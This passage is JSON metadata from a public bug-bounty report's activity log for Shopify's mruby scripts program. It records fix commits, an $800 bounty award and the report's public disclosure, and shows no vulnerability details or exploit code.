soon.","markdown_message":"\u003cp\u003eThanks again for your report. This issue was addressed in the following upstream commits:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/mruby/mruby/commit/246db71139a78ab05fe2750663c7e900c2f3c7ce\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F246db71139a78ab05fe2750663c7e900c2f3c7ce\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/246db71139a78ab05fe2750663c7e900c2f3c7ce\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/mruby/mruby/commit/0a1f15e57c061d4caee8dfff2366886bff4ed513\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F0a1f15e57c061d4caee8dfff2366886bff4ed513\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/0a1f15e57c061d4caee8dfff2366886bff4ed513\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eOur next round of bounty decisions will take place within two weeks, so we\u0026#39;ll be in touch with you again soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T15:46:18.910Z","updated_at":"2017-04-03T15:46:18.910Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ston3","url":"/ston3"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1606076,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the MRuby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify and the MRuby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-11T22:39:49.480Z","updated_at":"2017-04-11T22:39:49.480Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"ston3","url":"/ston3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1610626,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-13T21:30:40.765Z","updated_at":"2017-04-13T21:30:40.765Z","first_to_agree":true,"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1672277,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-13T21:30:42.376Z","updated_at":"2017-05-13T21:30:42.376Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}